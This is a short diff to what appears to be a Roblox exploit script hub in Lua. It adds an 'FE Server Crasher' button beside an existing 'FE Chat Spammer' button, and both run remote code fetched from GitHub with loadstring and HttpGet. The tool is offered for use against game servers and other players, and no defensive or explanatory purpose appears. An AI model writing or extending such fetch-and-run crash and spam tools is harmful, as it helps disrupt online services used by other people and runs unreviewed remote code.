@@ -68,6 +68,10 @@ Section:NewButton("FE Chat Spammer", "FE", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Jeremyrock326/Jeremyrock326.github.io/main/ChatSpammed.lua"))()
 end)
 
+Section:NewButton("FE Server Crasher", "FE", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/cfreemepq/Roblox-Server-Crash/main/Crasher.lua"))()
+end)
+
 -- Script Hubs
 local Tab = Window:NewTab("Script Hubs")
 local HubSection = Tab:NewSection("Script Hubs")
